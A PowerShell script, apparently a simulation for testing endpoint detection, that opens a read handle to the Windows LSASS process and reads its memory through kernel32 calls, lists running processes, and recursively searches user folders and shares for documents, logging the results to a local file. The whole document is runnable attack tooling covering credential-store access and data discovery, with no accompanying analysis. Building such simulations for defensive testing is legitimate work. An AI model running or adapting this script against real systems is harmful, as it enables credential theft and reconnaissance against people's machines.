# Malicious-style PowerShell Script to Read LSASS Memory

# Import required .NET classes for Windows API calls
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class MemoryAccess {
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

# Constants for process access
$PROCESS_VM_READ = 0x0010
$PROCESS_QUERY_INFORMATION = 0x0400

# Log file for storing results
$outputFile = ".\LSASS_Memory_Read.txt"
"LSASS Memory Read Log - $(Get-Date)" | Out-File $outputFile -Encoding UTF8

# Function to log results to the file
Function Log-Result {
    param ([string]$message)
    Write-Host $message
    Add-Content -Path $outputFile -Value $message
}

# 1. Attempt to Access LSASS Memory
Write-Host "[*] Attempting to access LSASS memory..."
try {
    $lsass = Get-Process -Name "lsass" -ErrorAction Stop
    Log-Result "[*] LSASS Process ID: $($lsass.Id)"

    # Open a handle to the LSASS process
    $lsassHandle = [MemoryAccess]::OpenProcess($PROCESS_VM_READ -bor $PROCESS_QUERY_INFORMATION, $false, $lsass.Id)
    if ($lsassHandle -eq [IntPtr]::Zero) {
        throw "Failed to obtain handle to LSASS. Access denied or insufficient privileges."
    }
    Log-Result "[*] Successfully opened handle to LSASS."

    # Attempt to read memory from LSASS
    $baseAddress = [IntPtr]0x00007FFDE0000000  # Example address; may need adjustment
    $buffer = New-Object byte[] (256)          # Buffer size of 256 bytes
    $bytesRead = 0
    $success = [MemoryAccess]::ReadProcessMemory($lsassHandle, $baseAddress, $buffer, $buffer.Length, [ref]$bytesRead)

    if ($success) {
        $memoryContent = [System.Text.Encoding]::ASCII.GetString($buffer)
        Log-Result "[*] Successfully read memory from LSASS: $memoryContent"
    } else {
        $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        throw "Failed to read memory. Error Code: $errorCode"
    }

    # Close the process handle
    [MemoryAccess]::CloseHandle($lsassHandle)
    Log-Result "[*] Closed handle to LSASS."
} catch {
    Log-Result "[*] Failed to target LSASS: $_"
}

# 2. Enumerate Running Processes
Write-Host "[*] Enumerating running processes..."
$processes = Get-Process | Select-Object Name, Id, CPU, StartTime
foreach ($proc in $processes) {
    Log-Result "Process: $($proc.Name), ID: $($proc.Id), CPU: $($proc.CPU), Start Time: $($proc.StartTime)"
}

# 3. Search for Sensitive Files
Write-Host "[*] Searching for sensitive files..."
$sensitiveExtensions = @("*.docx", "*.xlsx", "*.pdf", "*.txt")
$searchPaths = @("C:\Users", "C:\Documents", "C:\Shares")

foreach ($path in $searchPaths) {
    foreach ($ext in $sensitiveExtensions) {
        try {
            Get-ChildItem -Path $path -Recurse -Include $ext -ErrorAction SilentlyContinue | 
                Select-Object FullName, LastWriteTime |
                ForEach-Object { Log-Result "File: $($_.FullName), Last Modified: $($_.LastWriteTime)" }
        } catch {
            Log-Result "[*] Failed to search $($path) for $($ext): $($_)"
        }
    }
}

# Completion Message
Write-Host "[*] Malicious actions simulated. Results saved to $outputFile."
Log-Result "[*] Script execution completed at $(Get-Date)."
